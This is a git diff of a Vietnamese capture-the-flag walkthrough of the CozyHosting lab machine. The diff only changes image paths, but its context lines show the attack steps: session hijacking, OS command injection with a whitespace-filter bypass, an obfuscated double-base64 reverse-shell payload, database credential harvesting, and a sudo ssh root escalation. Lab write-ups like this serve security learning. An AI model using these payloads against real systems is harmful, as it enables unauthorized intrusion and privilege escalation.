@@ -42,17 +42,17 @@ Nmap done: 1 IP address (1 host up) scanned in 196.24 seconds
 
 Lướt qua cổng 80 phát hiện 1 trang login
 
-![CozyHosting](/posts/CozyHosting/Untitled.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled.png)
 
 Cổng 8090 chạy http server python có leak 1 file **cloudhosting-0.0.1.jar,** có thể lấy được source code từ đây.
 
-![CozyHosting](/posts/CozyHosting/Untitled%201.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%201.png)
 
 ### Directory/File Scanning
 
 Truy cập endpoint không tồn tại thì response trả về 1 trang thông báo lỗi của Spring boot
 
-![CozyHosting](/posts/CozyHosting/Untitled%202.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%202.png)
 
 Scan directory với wordlist spring-boot có sẵn trong seclists.
 
@@ -116,11 +116,11 @@ X-Frame-Options: DENY
 
 Có được session của thằng kanderson đem thay session hiện tại của mình. Và:
 
-![CozyHosting](/posts/CozyHosting/Untitled%203.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%203.png)
 
 Ngay dưới có chức năng ssh connection, thử chạy ssh server và connect tới máy mình thì nó báo connection timeout. Nhưng:
 
-![CozyHosting](/posts/CozyHosting/Untitled%204.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%204.png)
 
 url chuyển hướng lại chứa output của lệnh ssh =)) Khả năng OS Command Injection rất cao.
 
@@ -132,15 +132,15 @@ ssh <username>@<hostname>
 
 Chèn 1 payload command substitution để test:
 
-![CozyHosting](/posts/CozyHosting/Untitled%205.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%205.png)
 
 ⇒ OS Command Injection
 
-![CozyHosting](/posts/CozyHosting/Untitled%206.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%206.png)
 
 Trường username bị filter dấu whitespaces. Có 1 vài tricks để bypass whitespaces ([tại đây](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces))
 
-![CozyHosting](/posts/CozyHosting/Untitled%207.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%207.png)
 
 ping thành công, tức câu lệnh của mình đã được thực thi.
 
@@ -152,7 +152,7 @@ Double-base64 payload tạo revershell để bypass một số kí tự đặc b
 echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0ME5TODVPVGs1SURBK0pqRUsK|base64${IFS}-d|base64${IFS}-d|bash
 ```
 
-![CozyHosting](/posts/CozyHosting/Untitled%208.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%208.png)
 
 ## Privilege Escalation
 
@@ -162,11 +162,11 @@ Trước tiên, xem trong đây những user nào có shell
 app@cozyhosting:/$ cat /etc/passwd | grep bash
 ```
 
-![CozyHosting](/posts/CozyHosting/Untitled%209.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%209.png)
 
 Flag user nằm trong thư mục home của josh, nhưng với user hiện tại không có quyền đọc. Do vậy, mình phải leo lên josh trước. (Ngoài ra, còn có user _postgres_ ⇒ có thể dbms của hệ thống này chạy PostgreSQL)
 
-![CozyHosting](/posts/CozyHosting/Untitled%2010.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2010.png)
 
 ### Josh
 
@@ -174,15 +174,15 @@ File jar ban đầu mình tải về còn chưa đụng tới, ta có thể deco
 
 Như đã đề cập ở trước, trong hệ thống tồn tại user _postgres_. Thử check PostgreSQL có đang hoạt động không (PostgreSQL mặc định chạy ở cổng 5432)
 
-![CozyHosting](/posts/CozyHosting/Untitled%2011.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2011.png)
 
 Vậy đã sure rằng PostgreSQL hoạt động. Tiếp theo, hỏi chatgpt xem file config của thằng PostgreSQL nó nằm ở đâu trong source code:
 
-![CozyHosting](/posts/CozyHosting/Untitled%2012.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2012.png)
 
 Nó nằm ở file **application.properties** hoặc **application.yml**
 
-![CozyHosting](/posts/CozyHosting/Untitled%2013.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2013.png)
 
 Đây rồi, tiến hành login
 
@@ -190,7 +190,7 @@ Nó nằm ở file **application.properties** hoặc **application.yml**
 psql -h localhost -d cozyhosting -U postgres -p 5432 -W
 ```
 
-![CozyHosting](/posts/CozyHosting/Untitled%2014.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2014.png)
 
 Tables
 
@@ -243,13 +243,13 @@ Session completed.
 
 Liệu josh với admin có phải là một?
 
-![CozyHosting](/posts/CozyHosting/Untitled%2015.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2015.png)
 
 Josh pwned!
 
 ### Root
 
-![CozyHosting](/posts/CozyHosting/Untitled%2016.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2016.png)
 
 Payload từ GTFobins: [https://gtfobins.github.io/gtfobins/ssh/](https://gtfobins.github.io/gtfobins/ssh/)
 
@@ -257,4 +257,4 @@ Payload từ GTFobins: [https://gtfobins.github.io/gtfobins/ssh/](https://gtfobi
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
-![CozyHosting](/posts/CozyHosting/Untitled%2017.png)
+![CozyHosting](/assets/img/posts/CozyHosting/Untitled%2017.png)
